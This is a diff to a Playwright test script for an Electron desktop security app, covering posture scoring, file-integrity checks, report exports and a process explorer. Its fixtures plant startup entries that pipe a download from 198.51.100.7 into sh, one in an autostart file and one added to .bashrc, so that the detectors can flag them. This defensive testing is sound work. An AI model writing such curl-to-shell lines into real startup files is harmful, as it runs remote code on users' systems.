@@ -19,7 +19,12 @@ const { _electron: electron } = require("playwright");
 const root = join(dirname(fileURLToPath(import.meta.url)), "..");
 const shots = process.argv[2];
 const step = (text) => console.log(`✓ ${text}`);
-const shot = async (page, name) => shots && page.screenshot({ path: join(shots, `${name}.png`) });
+const shot = async (page, name) => {
+  if (!shots) return;
+  // Let entrance animations settle so the picture shows the finished screen (infinite ones are skipped).
+  await page.evaluate(() => Promise.all(document.getAnimations().filter((a) => a.effect?.getTiming().iterations !== Infinity).map((a) => a.finished.catch(() => {}))));
+  await page.screenshot({ path: join(shots, `${name}.png`) });
+};
 
 const EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
 const SAMPLE = Buffer.from("this stands in for a sample listed on MalwareBazaar");
@@ -118,7 +123,10 @@ await writeFile(
   JSON.stringify({ serverUrl: "http://localhost:8799", watchFolders: [downloads], watchEnabled: true, autoQuarantine: true, useClamav: true, cloudLookup: false, language: "en", ransomwareWatch: true, protectedFolders: [documents] }),
 );
 const home = join(work, "home");
+const exports = join(work, "exports");
+await mkdir(exports);
 await mkdir(join(home, ".config", "autostart"), { recursive: true });
+await writeFile(join(home, ".bashrc"), "export PATH=$PATH:$HOME/bin\n");
 await writeFile(join(home, ".config", "autostart", "updater.desktop"), "[Desktop Entry]\nType=Application\nName=System Updater\nExec=sh -c 'curl http://198.51.100.7/u.sh | sh'\n");
 // A program reachable from the network on the VNC port, which the security centre should flag.
 const vnc = createTcpServer().listen(5900, "0.0.0.0");
@@ -150,7 +158,7 @@ await writeFile(join(files, "invoice.pdf"), Buffer.concat([Buffer.from("MZ"), Bu
 const app = await electron.launch({
   executablePath: require("electron"),
   args: [join(root, "dist", "main.js"), "--no-sandbox"],
-  env: { ...process.env, HOME: home, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files },
+  env: { ...process.env, HOME: home, SENTINEL_DESKTOP_PROFILE: profile, SENTINEL_DESKTOP_HOME: files, QALAA_EXPORT_DIR: exports },
 });
 const page = await app.firstWindow();
 await page.waitForSelector("nav button");
@@ -297,6 +305,41 @@ assert.match(programs, new RegExp(`Process .*${sleeper.pid}`));
 assert.match(await page.locator("#encryption").innerText(), /Disk encryption/);
 await shot(page, "desktop-programs");
 step("running programs checked; one started from a temporary folder is flagged; disk encryption reported");
+
+await page.click("#posture-run");
+await page.waitForFunction(() => /^\d+$/.test(document.querySelector("#posture-score")?.textContent ?? ""), null, { timeout: 60000 });
+const postureText = await page.locator("#posture").innerText();
+assert.match(postureText, /Firewall is on/);
+assert.match(postureText, /No world-writable folders in PATH/);
+await shot(page, "desktop-posture");
+step("security posture: hardening checks scored, each with how to fix it");
+
+await page.waitForSelector("#integrity-ok");
+await writeFile(join(home, ".bashrc"), "export PATH=$PATH:$HOME/bin\ncurl http://198.51.100.7/x | sh\n");
+await page.click("#integrity-check");
+await page.waitForSelector("#integrity-changes >> text=.bashrc");
+assert.match(await page.locator("#integrity-changes").innerText(), /Changed/);
+await shot(page, "desktop-integrity");
+await page.locator("#integrity-changes").getByRole("button", { name: "It was me" }).click();
+await page.waitForSelector("#integrity-ok");
+step("file integrity: a changed start-up file is detected by its SHA-256 and can be accepted");
+
+await page.click('[data-report="security-html"]');
+for (let i = 0; i < 100 && !(await readdir(exports)).some((f) => f.endsWith(".html")); i++) await new Promise((resolve) => setTimeout(resolve, 200));
+const htmlReport = (await readdir(exports)).find((f) => f.endsWith(".html"));
+const reportText = await readFile(join(exports, htmlReport), "utf8");
+assert.match(reportText, /Security audit/);
+assert.match(reportText, /Hardening checks/);
+assert.doesNotMatch(reportText, /<script/i);
+await page.click('[data-report="inventory-pdf"]');
+for (let i = 0; i < 150 && !(await readdir(exports)).some((f) => f.endsWith(".pdf")); i++) await new Promise((resolve) => setTimeout(resolve, 200));
+const pdf = (await readdir(exports)).find((f) => f.endsWith(".pdf"));
+assert.ok(pdf, "a PDF report was written");
+assert.equal((await readFile(join(exports, pdf))).subarray(0, 4).toString(), "%PDF");
+await page.click('[data-report="performance-csv"]');
+for (let i = 0; i < 100 && !(await readdir(exports)).some((f) => f.endsWith(".csv")); i++) await new Promise((resolve) => setTimeout(resolve, 200));
+assert.match(await readFile(join(exports, (await readdir(exports)).find((f) => f.endsWith(".csv"))), "utf8"), /Programs using the most memory/);
+step("reports: security audit (HTML), hardware inventory (PDF) and performance snapshot (CSV) saved locally");
 await page.waitForFunction(() => !document.querySelector("#startup")?.textContent?.includes("New since your last review"));
 step("security centre: risky open port, startup entry running a downloaded script, new startup item since last review");
 
@@ -304,7 +347,8 @@ step("security centre: risky open port, startup entry running a downloaded scrip
 await page.click('[data-tab="monitor"]');
 await page.waitForFunction(() => /\d+%/.test(document.querySelector("#monitor-cpu .big")?.textContent ?? ""));
 await page.waitForFunction(() => /\d/.test(document.querySelector("#monitor-memory .big")?.textContent ?? ""), null, { timeout: 15000 });
-await page.waitForSelector("#monitor-pane #monitor-filter");
+await page.click('[data-pane="connections"]');
+await page.waitForSelector("#monitor-external");
 await page.uncheck("#monitor-external");
 await page.fill("#monitor-filter", "5900");
 await page.waitForFunction(() => /LISTEN/.test(document.querySelector("#monitor-pane table")?.textContent ?? ""));
@@ -316,6 +360,46 @@ await page.waitForFunction(() => /Background services/.test(document.querySelect
 await page.click('[data-pane="events"]');
 await page.waitForFunction(() => /system log/i.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
 step("system monitor: live CPU and memory, connections with their programs, services and system log");
+
+// Process explorer: tree, inspect (hash + signature), suspend, resume, end.
+await page.click('[data-pane="processes"]');
+await page.waitForSelector("#monitor-pane table");
+await page.fill("#monitor-filter", "sleepy");
+await page.waitForFunction(() => /sleepy/.test(document.querySelector("#monitor-pane table")?.textContent ?? ""));
+const sleepyRow = page.locator("#monitor-pane tr", { hasText: String(sleeper.pid) }).first();
+await sleepyRow.getByRole("button", { name: "Inspect" }).click();
+await page.waitForFunction(() => /[0-9a-f]{64}/.test(document.querySelector("#monitor-pane tr.detail")?.textContent ?? ""));
+const detail = await page.locator("#monitor-pane tr.detail").innerText();
+assert.match(detail, /Not signed|Installed by/);
+assert.match(detail, /sleepy 600/);
+page.once("dialog", (d) => d.accept());
+await sleepyRow.getByRole("button", { name: "Suspend", exact: true }).click();
+await page.waitForFunction(() => document.querySelector("#monitor-pane tr.flag") !== null);
+const stopped = (await readFile(`/proc/${sleeper.pid}/stat`, "utf8")).split(") ")[1]?.[0];
+assert.equal(stopped, "T", "the process is stopped");
+await page.locator("#monitor-pane tr", { hasText: String(sleeper.pid) }).first().getByRole("button", { name: "Resume", exact: true }).click();
+await page.waitForFunction(() => document.querySelector("#monitor-pane tr.flag") === null);
+await shot(page, "desktop-processes");
+page.once("dialog", (d) => d.accept());
+await page.locator("#monitor-pane tr", { hasText: String(sleeper.pid) }).first().getByRole("button", { name: "End", exact: true }).click();
+for (let i = 0; i < 40 && sleeper.exitCode === null && sleeper.signalCode === null; i++) await new Promise((resolve) => setTimeout(resolve, 100));
+assert.ok(sleeper.exitCode !== null || sleeper.signalCode !== null, "the process was ended");
+step("process explorer: tree with threads and memory, SHA-256 and signature, suspend, resume and end");
+
+await page.click('[data-pane="storage"]');
+await page.waitForFunction(() => /Volumes/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
+await page.click('[data-pane="network"]');
+await page.fill("#dns-query", "127.0.0.1");
+await page.click("#dns-go");
+await page.waitForSelector("#dns-result >> text=This computer");
+assert.match(await page.locator("#monitor-pane").innerText(), /Network interfaces/);
+await page.click('[data-pane="history"]');
+await page.waitForFunction(() => /7 days/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
+assert.match(await page.locator("#monitor-pane").innerText(), /Security activity/);
+await page.click('[data-pane="events"]');
+await page.selectOption("#event-source", "security");
+await page.waitForFunction(() => /Sign-ins, failed passwords/.test(document.querySelector("#monitor-pane")?.textContent ?? ""));
+step("storage inspector, DNS lookup with address classification, interface counters, local history, security log");
 await page.click('[data-tab="security"]');
 
 // Scheduled scan settings save.
